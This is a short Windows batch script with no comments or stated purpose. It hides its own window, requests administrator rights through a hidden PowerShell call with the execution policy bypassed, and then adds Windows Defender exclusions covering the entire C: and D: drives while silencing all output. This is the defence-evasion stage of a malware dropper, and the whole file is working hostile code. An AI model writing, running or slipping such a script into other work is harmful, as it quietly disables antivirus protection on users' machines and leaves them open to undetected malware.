@echo off
setlocal EnableDelayedExpansion

if not defined RUNNING_AS_HIDDEN (
    set "RUNNING_AS_HIDDEN=1"
    start /min cmd /c "%~f0"
    exit /b
)

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c','%~f0' -Verb RunAs" >nul 2>&1
    exit /b
)

powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\'" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'D:\'" >nul 2>&1

exit /b
